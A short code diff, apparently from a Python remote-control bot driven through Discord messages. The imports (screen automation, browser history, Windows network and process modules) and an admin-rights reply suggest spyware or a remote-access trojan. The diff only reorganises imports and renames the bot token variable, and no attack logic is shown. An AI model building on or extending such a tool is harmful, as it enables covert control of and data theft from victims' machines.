@@ -20,10 +20,8 @@ import json
 import base64
 import comtypes
 import pyautogui
-import win32gui
-import win32con
-import win32net
-import win32process
+from win32 import win32gui, win32net, win32process
+import win32.lib.win32con as win32con
 import browserhistory as bh
 
 from comtypes import CLSCTX_ALL
@@ -532,4 +530,4 @@ async def on_message(message):
             else:
                 await message.channel.send("[!] Admin rights are required for this operation")
 
-client.run(token)
+client.run(TOKEN)
